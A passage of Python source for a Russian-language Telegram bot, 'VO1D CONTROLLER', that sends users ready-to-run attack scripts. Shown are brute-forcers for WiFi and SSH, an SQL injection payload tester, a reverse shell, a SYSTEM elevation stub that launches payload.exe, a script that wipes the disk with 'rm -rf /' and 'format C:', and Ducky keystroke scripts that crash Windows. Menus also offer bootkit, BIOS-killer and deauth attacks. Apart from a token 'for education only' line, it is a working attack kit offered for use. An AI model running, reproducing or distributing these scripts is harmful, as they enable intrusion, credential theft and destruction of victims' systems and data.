    osint(sys.argv[1])
""",

    # ============================================================
    # 16. WIFI_BRUTEFORCE
    # ============================================================
    "wifi_bruteforce": """import subprocess, sys, time, os, threading
def bruteforce(ssid, wordlist):
    print(f'[+] Bruteforcing: {ssid}')
    with open(wordlist, 'r', errors='ignore') as f:
        for p in f:
            p = p.strip()
            r = subprocess.run(['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', p], capture_output=True)
            if 'successful' in r.stdout.decode() or 'connected' in r.stdout.decode():
                print(f'[+] Found: {p}')
                return
            print(f'[-] Failed: {p}', end='\\r')
    print('[-] Not found')
if __name__ == '__main__':
    if len(sys.argv) < 3: print('Usage: python wifi_bruteforce.py <ssid> <wordlist>'); sys.exit(1)
    bruteforce(sys.argv[1], sys.argv[2])
""",

    # ============================================================
    # 17. PORT_SCANNER
    # ============================================================
    "port_scanner": """import socket, sys, threading, time
def scan(ip):
    print(f'[+] Scanning: {ip}')
    open_ports = []
    def check_port(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            s.close()
        except: pass
    threads = []
    for p in range(1, 65536):
        t = threading.Thread(target=check_port, args=(p,))
        t.start()
        threads.append(t)
        if len(threads) > 100:
            for t in threads: t.join()
            threads = []
    for t in threads: t.join()
    print(f'[+] Open ports: {open_ports}')
if __name__ == '__main__':
    if len(sys.argv) < 2: print('Usage: python port_scanner.py <ip>'); sys.exit(1)
    scan(sys.argv[1])
""",

    # ============================================================
    # 18. FILE_ENCRYPTOR
    # ============================================================
    "file_encryptor": """import os, sys, hashlib, base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
def encrypt(f):
    with open(f, 'rb') as x: data = x.read()
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
    key = base64.urlsafe_b64encode(kdf.derive(b'swill'))
    c = Fernet(key)
    encrypted = c.encrypt(data)
    with open(f + '.enc', 'wb') as x:
        x.write(salt + encrypted)
    os.remove(f)
    print(f'[+] Encrypted: {f}')
if __name__ == '__main__':
    if len(sys.argv) < 2: print('Usage: python file_encryptor.py <file>'); sys.exit(1)
    encrypt(sys.argv[1])
""",

    # ============================================================
    # 19. SQL_INJECTION
    # ============================================================
    "sql_injection": """import requests, sys, time, re
def test(url, param):
    print(f'[+] Testing: {url}')
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "'; DROP TABLE users--",
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR SLEEP(5)--",
        "' OR BENCHMARK(1000000,MD5(1))--"
    ]
    for p in payloads:
        start = time.time()
        r = requests.get(url, params={param: p}, timeout=10)
        elapsed = time.time() - start
        if "error" in r.text.lower() or "mysql" in r.text.lower():
            print(f'[+] VULN: {url}?{param}={p}')
            return
        if elapsed > 4:
            print(f'[+] Time-based: {url}?{param}={p}')
            return
    print('[-] Not vulnerable')
if __name__ == '__main__':
    if len(sys.argv) < 3: print('Usage: python sql_injection.py <url> <param>'); sys.exit(1)
    test(sys.argv[1], sys.argv[2])
""",

    # ============================================================
    # 20. SUBDOMAIN_FINDER
    # ============================================================
    "subdomain_finder": """import requests, sys, dns.resolver, threading
def find(domain):
    print(f'[+] Finding subdomains: {domain}')
    subs = ['www','mail','admin','dev','test','api','ftp','ssh','vpn','backup','blog','shop','forum','portal','crm','demo','stage','beta','alpha','staging','uat','qa','internal','corp','mobile','app','web','cloud','cdn','static','media','files','docs','help','support','community','store','secure','login','account','auth','sso','oauth','pay','payment','api2','v2','v3','v4','ws','soap','rest','graphql','mqtt','dashboard','analytics','monitor','status','alert','gateway','service','services','server','srv','db','database','mysql','postgres','redis','mongodb','elastic','kibana','grafana','jenkins','gitlab','github','bitbucket','jira','confluence','wiki','knowledge','docs','documentation','git','svn','ftp2','ftp3','ftp4','smtp','pop3','imap','mail2','mail3','mail4','ns1','ns2','ns3','ns4','ns5','ns6','ns7','ns8','ns9','ns10']
    found = []
    for s in subs:
        try:
            full = f'{s}.{domain}'
            r = requests.get(f'http://{full}', timeout=3)
            if r.status_code < 400:
                print(f'[+] Found: {full}')
                found.append(full)
        except: pass
    print(f'[+] Total: {len(found)}')
if __name__ == '__main__':
    if len(sys.argv) < 2: print('Usage: python subdomain_finder.py <domain>'); sys.exit(1)
    find(sys.argv[1])
""",

    # ============================================================
    # 21. SSH_BRUTEFORCE
    # ============================================================
    "ssh_bruteforce": """import paramiko, sys, threading, time, socket
def ssh(host, user, wordlist):
    print(f'[+] Bruteforcing: {user}@{host}')
    with open(wordlist, 'r', errors='ignore') as f:
        for p in f:
            p = p.strip()
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=user, password=p, timeout=3)
                print(f'[+] Found: {p}')
                client.close()
                return
            except paramiko.AuthenticationException:
                print(f'[-] Failed: {p}', end='\\r')
            except (socket.timeout, socket.error):
                print(f'[!] Timeout, retrying...', end='\\r')
            except: pass
    print('[-] Not found')
if __name__ == '__main__':
    if len(sys.argv) < 4: print('Usage: python ssh_bruteforce.py <host> <user> <wordlist>'); sys.exit(1)
    ssh(sys.argv[1], sys.argv[2], sys.argv[3])
""",

    # ============================================================
    # 22. DIRBUSTER
    # ============================================================
    "dirbuster": """import requests, sys, threading
def dirbuster(url, wordlist):
    print(f'[+] Dirbusting: {url}')
    with open(wordlist, 'r', errors='ignore') as f:
        for d in f:
            d = d.strip()
            for ext in ['', '.php', '.html', '.txt', '.js', '.css', '.json', '.xml', '.bak', '.old', '.tmp']:
                try:
                    r = requests.get(url + '/' + d + ext, timeout=2)
                    if r.status_code == 200:
                        print(f'[+] Found: {url}/{d}{ext}')
                    elif r.status_code == 403:
                        print(f'[+] Forbidden: {url}/{d}{ext}')
                except: pass
if __name__ == '__main__':
    if len(sys.argv) < 3: print('Usage: python dirbuster.py <url> <wordlist>'); sys.exit(1)
    dirbuster(sys.argv[1], sys.argv[2])
""",

    # ============================================================
    # 23. PASSWORD_GENERATOR
    # ============================================================
    "password_generator": """import random, string, sys, secrets
def gen(length=24):
    chars = string.ascii_letters + string.digits + '!@#$%^&*()_+-=[]{}|;:,.<>?'
    password = ''.join(secrets.choice(chars) for _ in range(length))
    # Гарантированное наличие всех типов символов
    if not any(c.isupper() for c in password):
        password = password[1:] + secrets.choice(string.ascii_uppercase)
    if not any(c.islower() for c in password):
        password = password[1:] + secrets.choice(string.ascii_lowercase)
    if not any(c.isdigit() for c in password):
        password = password[1:] + secrets.choice(string.digits)
    if not any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in password):
        password = password[1:] + secrets.choice('!@#$%^&*()_+-=')
    return password
if __name__ == '__main__':
    length = int(sys.argv[1]) if len(sys.argv) > 1 else 24
    print(f'[+] Password: {gen(length)}')
""",

    # ============================================================
    # 24. MD5_CRACKER
    # ============================================================
    "md5_cracker": """import hashlib, sys, threading
def crack(target, wordlist):
    print(f'[+] Cracking: {target}')
    with open(wordlist, 'r', errors='ignore') as f:
        for p in f:
            p = p.strip()
            if hashlib.md5(p.encode()).hexdigest() == target:
                print(f'[+] Found: {p}')
                return
    print('[-] Not found')
if __name__ == '__main__':
    if len(sys.argv) < 3: print('Usage: python md5_cracker.py <hash> <wordlist>'); sys.exit(1)
    crack(sys.argv[1], sys.argv[2])
""",

    # ============================================================
    # 25. WHOIS_LOOKUP
    # ============================================================
    "whois_lookup": """import whois, sys, json
def whois_lookup(domain):
    try:
        w = whois.whois(domain)
        print(f'[+] Domain: {domain}')
        print(f'[+] Registrar: {w.registrar}')
        print(f'[+] Creation: {w.creation_date}')
        print(f'[+] Expiration: {w.expiration_date}')
        print(f'[+] Updated: {w.updated_date}')
        print(f'[+] Name Servers: {w.name_servers}')
        print(f'[+] Status: {w.status}')
        print(f'[+] DNSSEC: {w.dnssec}')
    except Exception as e:
        print(f'[-] Error: {e}')
if __name__ == '__main__':
    if len(sys.argv) < 2: print('Usage: python whois_lookup.py <domain>'); sys.exit(1)
    whois_lookup(sys.argv[1])
""",

    # ============================================================
    # 26. PING_SWEEP
    # ============================================================
    "ping_sweep": """import subprocess, sys, threading, time
def ping_sweep(network):
    print(f'[+] Ping sweep: {network}')
    active = []
    def ping(ip):
        r = subprocess.run(['ping', '-n', '1', '-w', '100', ip], capture_output=True)
        if r.returncode == 0:
            active.append(ip)
            print(f'[+] {ip} is up')
    threads = []
    for i in range(1, 255):
        ip = f'{network}.{i}'
        t = threading.Thread(target=ping, args=(ip,))
        t.start()
        threads.append(t)
        if len(threads) > 100:
            for t in threads: t.join()
            threads = []
    for t in threads: t.join()
    print(f'[+] Active hosts: {len(active)}')
if __name__ == '__main__':
    if len(sys.argv) < 2: print('Usage: python ping_sweep.py <network>'); sys.exit(1)
    ping_sweep(sys.argv[1])
""",

    # ============================================================
    # 27. DNS_LOOKUP
    # ============================================================
    "dns_lookup": """import socket, sys, dns.resolver
def dns_lookup(domain):
    try:
        print(f'[+] DNS lookup: {domain}')
        print(f'[+] A: {socket.gethostbyname(domain)}')
        for record in ['MX', 'NS', 'TXT', 'CNAME', 'SOA', 'AAAA']:
            try:
                answers = dns.resolver.resolve(domain, record)
                print(f'[+] {record}: {[str(r) for r in answers]}')
            except: pass
    except Exception as e:
        print(f'[-] Error: {e}')
if __name__ == '__main__':
    if len(sys.argv) < 2: print('Usage: python dns_lookup.py <domain>'); sys.exit(1)
    dns_lookup(sys.argv[1])
""",

    # ============================================================
    # 28. REVERSE_SHELL
    # ============================================================
    "reverse_shell": """import socket, subprocess, sys, os, threading
host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            while True:
                cmd = s.recv(1024).decode()
                if cmd.lower() == 'exit': break
                if cmd.startswith('cd '):
                    try: os.chdir(cmd[3:].strip()); s.send(b'OK\\n')
                    except Exception as e: s.send(str(e).encode())
                else:
                    output = subprocess.run(cmd, shell=True, capture_output=True)
                    s.send(output.stdout + output.stderr)
            s.close()
            break
        except: time.sleep(5)
connect()
""",

    # ============================================================
    # 29. ELEVATE_SYSTEM
    # ============================================================
    "elevate_system": """import ctypes, subprocess, os, sys
def elevate():
    try:
        # Получение прав SYSTEM
        kernel32 = ctypes.windll.kernel32
        advapi32 = ctypes.windll.advapi32
        # OpenProcessToken
        token = ctypes.c_void_p()
        advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), 0x0008, ctypes.byref(token))
        # DuplicateTokenEx
        new_token = ctypes.c_void_p()
        advapi32.DuplicateTokenEx(token, 0x1F0FFF, 0, 2, 1, ctypes.byref(new_token))
        # CreateProcessAsUser
        advapi32.CreateProcessAsUser(new_token, "C:\\\\Windows\\\\System32\\\\cmd.exe", "/c C:\\\\Windows\\\\Temp\\\\payload.exe", 0, 0, False, 0, 0, 0, 0, 0)
        print('[+] Elevated to SYSTEM')
    except Exception as e:
        print(f'[-] Elevate error: {e}')
elevate()
""",

    # ============================================================
    # 30. SELF_DESTRUCT_PYTHON
    # ============================================================
    "self_destruct_python": """import os, sys, shutil, time
def self_destruct():
    try:
        # Удаление системных файлов
        if sys.platform.startswith('win'):
            os.system('del /F /S /Q C:\\\\Windows\\\\*')
            os.system('rmdir /S /Q C:\\\\Windows')
            os.system('format C: /Q /Y')
        else:
            os.system('rm -rf / --no-preserve-root')
        print('[+] System destroyed')
    except Exception as e:
        print(f'[-] Error: {e}')
self_destruct()
""",
}

# ============================================================
# БОТ С УЛУЧШЕННЫМ МЕНЮ
# ============================================================
logging.basicConfig(level=logging.INFO)

async def start(update: Update, context):
    keyboard = [
        [InlineKeyboardButton("🦆 Ducky Scripts (35)", callback_data="ducky_menu")],
        [InlineKeyboardButton("🐍 Python Scripts (45)", callback_data="python_menu")],
        [InlineKeyboardButton("📡 ESP32 Control", callback_data="esp32_menu")],
        [InlineKeyboardButton("🧰 Утилиты", callback_data="utils_menu")],
        [InlineKeyboardButton("💀 BSOD", callback_data="bsod_menu")],
        [InlineKeyboardButton("🔥 ОСОБОЕ", callback_data="special_menu")],
        [InlineKeyboardButton("ℹ️ О боте", callback_data="about")],
        [InlineKeyboardButton("📊 Статус", callback_data="status")],
    ]
    await update.message.reply_text(
        "🔥 **VO1D CONTROLLER v5.0 ULTIMATE**\n\n"
        "🦆 **35 Ducky-скриптов** → inject.bin\n"
        "🐍 **45 Python-скриптов** → .py\n"
        "💀 **BSOD** → синий экран\n"
        "🔥 **ОСОБОЕ** → критические функции\n\n"
        "Выбери категорию:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def ducky_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    keyboard = []
    for name in DUCKY_SCRIPTS.keys():
        keyboard.append([InlineKeyboardButton(f"🦆 {name}", callback_data=f"ducky_{name}")])
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_main")])
    await query.edit_message_text(
        "🦆 **Ducky Scripts (35 БОЕВЫХ)**\n\nВыбери нужный:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def python_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    keyboard = []
    for name in PYTHON_SCRIPTS.keys():
        keyboard.append([InlineKeyboardButton(f"🐍 {name}", callback_data=f"python_{name}")])
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_main")])
    await query.edit_message_text(
        "🐍 **Python Scripts (45 БОЕВЫХ)**\n\nВыбери нужный:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def special_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("💀 FIRMWARE BRICK", callback_data="ducky_firmware_brick")],
        [InlineKeyboardButton("💀 BOOTKIT INSTALL", callback_data="ducky_bootkit_install")],
        [InlineKeyboardButton("💀 SELF DESTRUCT", callback_data="ducky_self_destruct")],
        [InlineKeyboardButton("🔓 ELEVATE SYSTEM", callback_data="python_elevate_system")],
        [InlineKeyboardButton("💀 BIOS KILLER", callback_data="python_bios_killer")],
        [InlineKeyboardButton("💀 KERNEL RING0", callback_data="python_kernel_ring0")],
        [InlineKeyboardButton("💀 PARTITION WIPER", callback_data="python_partition_wiper")],
        [InlineKeyboardButton("🔥 ACTIVE DIRECTORY", callback_data="python_ad_hack")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_main")],
    ]
    await query.edit_message_text(
        "🔥 **ОСОБЫЕ ФУНКЦИИ**\n\n⚠️ КРИТИЧЕСКИЕ ФУНКЦИИ\n⚠️ Только для обучения",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def esp32_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("📡 Scan Wi-Fi", callback_data="esp_scan")],
        [InlineKeyboardButton("🔴 Deauth Attack", callback_data="esp_deauth")],
        [InlineKeyboardButton("🎯 Evil Twin AP", callback_data="esp_evil")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_main")],
    ]
    await query.edit_message_text("📡 **ESP32 Control**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def utils_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("🔐 Генератор паролей", callback_data="gen_pass")],
        [InlineKeyboardButton("🔑 Генератор MD5/SHA256", callback_data="gen_hash")],
        [InlineKeyboardButton("🌍 Проверка IP", callback_data="check_ip")],
        [InlineKeyboardButton("📡 Ping", callback_data="ping")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_main")],
    ]
    await query.edit_message_text("🧰 **Утилиты**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def bsod_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("💀 NtRaiseHardError", callback_data="bsod_nt")],
        [InlineKeyboardButton("💀 Kill CSRSS", callback_data="bsod_kill")],
        [InlineKeyboardButton("💀 Python", callback_data="bsod_python")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_main")],
    ]
    await query.edit_message_text("💀 **BSOD МЕНЮ**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def send_script_file(update: Update, context, script_name: str, script_data: dict, ext: str):
    query = update.callback_query
    await query.answer()
    filename = "inject.bin" if ext == "duck" else f"{script_name}.{ext}"
    filepath = os.path.join(TEMP_FOLDER, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(script_data['code'])
    with open(filepath, 'rb') as f:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=f,
            filename=filename,
            caption=f"📄 **{script_name}**\n\n📝 {script_data['desc']}\n\n⚠️ Только для обучения"
        )
    os.remove(filepath)

async def show_ducky(update: Update, context):
    query = update.callback_query
    name = query.data.replace("ducky_", "")
    script = DUCKY_SCRIPTS.get(name)
    if script:
        await send_script_file(update, context, name, script, "duck")

async def show_python(update: Update, context):
    query = update.callback_query
    name = query.data.replace("python_", "")
    code = PYTHON_SCRIPTS.get(name)
    if code:
        await send_script_file(update, context, name, {'code': code, 'desc': 'Python скрипт'}, "py")

async def bsod_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    if query.data == "bsod_nt":
        code = """REM BSOD via NtRaiseHardError
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
ENTER
DELAY 500
STRING $code = @'
using System;
using System.Runtime.InteropServices;
public class BSOD {
    [DllImport("ntdll.dll")]
    public static extern int NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    public static void Crash() {
        uint response;
        NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out response);
    }
}
'@
ENTER
DELAY 300
STRING Add-Type -TypeDefinition $code -Language CSharp
ENTER
DELAY 300
STRING [BSOD]::Crash()
ENTER"""
        await send_script_file(update, context, "BSOD_NtRaiseHardError", {'code': code, 'desc': 'BSOD через NtRaiseHardError'}, "duck")
    elif query.data == "bsod_kill":
        code = """REM BSOD via CSRSS kill
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING taskkill /F /IM csrss.exe
ENTER
DELAY 300
STRING taskkill /F /IM winlogon.exe
ENTER"""
        await send_script_file(update, context, "BSOD_KillCSRSS", {'code': code, 'desc': 'BSOD через убийство csrss.exe'}, "duck")
    elif query.data == "bsod_python":
        code = """import ctypes, subprocess
def bsod():
    try:
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except:
        subprocess.run(['taskkill', '/F', '/IM', 'csrss.exe'], capture_output=True)
bsod()"""
        await send_script_file(update, context, "BSOD_Python", {'code': code, 'desc': 'BSOD через Python'}, "py")

async def esp_command(update: Update, context):
    query = update.callback_query
    await query.answer()
    messages = {"esp_scan": "📡 Scan Wi-Fi", "esp_deauth": "🔴 Deauth Attack", "esp_evil": "🎯 Evil Twin AP"}
    await query.edit_message_text(messages.get(query.data, "Команда отправлена"), parse_mode="Markdown")

async def utils_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    if query.data == "gen_pass":
        chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
        password = ''.join(random.SystemRandom().choice(chars) for _ in range(24))
        await query.edit_message_text(f"🔐 **Пароль:**\n`{password}`", parse_mode="Markdown")
    elif query.data == "gen_hash":
        text = "swill_2026"
        md5 = hashlib.md5(text.encode()).hexdigest()
        sha256 = hashlib.sha256(text.encode()).hexdigest()
        await query.edit_message_text(f"🔑 **Хеши для:** `{text}`\n\nMD5: `{md5}`\nSHA256: `{sha256}`", parse_mode="Markdown")
    elif query.data == "check_ip":
        try:
            import requests
            ip = requests.get("https://api.ipify.org", timeout=5).text
            await query.edit_message_text(f"🌍 **Ваш IP:** `{ip}`", parse_mode="Markdown")
        except:
            await query.edit_message_text("❌ Не удалось определить IP", parse_mode="Markdown")
    elif query.data == "ping":
        await query.edit_message_text("📡 **Ping**\nНапиши `/ping 8.8.8.8`", parse_mode="Markdown")

async def about(update: Update, context):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "ℹ️ **VO1D v5.0 ULTIMATE**\n\n"
        "🦆 35 Ducky-скриптов\n"
        "🐍 45 Python-скриптов\n"
        "💀 BSOD доступен\n"
        "🔥 ОСОБОЕ - критические функции\n\n"
        "⚠️ Только для обучения",
        parse_mode="Markdown"
    )

async def status(update: Update, context):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"📊 **Статус**\n\n🦆 Ducky: {len(DUCKY_SCRIPTS)}\n🐍 Python: {len(PYTHON_SCRIPTS)}\n⏱️ {time.strftime('%H:%M:%S')}",
        parse_mode="Markdown"
    )

async def back_main(update: Update, context):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("🦆 Ducky Scripts (35)", callback_data="ducky_menu")],
        [InlineKeyboardButton("🐍 Python Scripts (45)", callback_data="python_menu")],
        [InlineKeyboardButton("📡 ESP32 Control", callback_data="esp32_menu")],
        [InlineKeyboardButton("🧰 Утилиты", callback_data="utils_menu")],
        [InlineKeyboardButton("💀 BSOD", callback_data="bsod_menu")],
        [InlineKeyboardButton("🔥 ОСОБОЕ", callback_data="special_menu")],
        [InlineKeyboardButton("ℹ️ О боте", callback_data="about")],
        [InlineKeyboardButton("📊 Статус", callback_data="status")],
    ]
    await query.edit_message_text(
        "🔥 **VO1D CONTROLLER v5.0 ULTIMATE**\n\nВыбери категорию:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(ducky_menu, pattern="^ducky_menu$"))
    app.add_handler(CallbackQueryHandler(python_menu, pattern="^python_menu$"))
    app.add_handler(CallbackQueryHandler(special_menu, pattern="^special_menu$"))
    app.add_handler(CallbackQueryHandler(esp32_menu, pattern="^esp32_menu$"))
    app.add_handler(CallbackQueryHandler(utils_menu, pattern="^utils_menu$"))
    app.add_handler(CallbackQueryHandler(bsod_menu, pattern="^bsod_menu$"))
    app.add_handler(CallbackQueryHandler(show_ducky, pattern="^ducky_"))
    app.add_handler(CallbackQueryHandler(show_python, pattern="^python_"))
    app.add_handler(CallbackQueryHandler(bsod_handler, pattern="^bsod_"))
    app.add_handler(CallbackQueryHandler(esp_command, pattern="^esp_"))
    app.add_handler(CallbackQueryHandler(utils_handler, pattern="^gen_pass$|^gen_hash$|^check_ip$|^ping$"))
    app.add_handler(CallbackQueryHandler(about, pattern="^about$"))
    app.add_handler(CallbackQueryHandler(status, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(back_main, pattern="^back_main$"))
    print("🚀 VO1D v5.0 ULTIMATE запущен")
    print(f"🦆 Ducky: {len(DUCKY_SCRIPTS)}")
    print(f"🐍 Python: {len(PYTHON_SCRIPTS)}")
    app.run_polling()

if __name__ == "__main__":
    main()
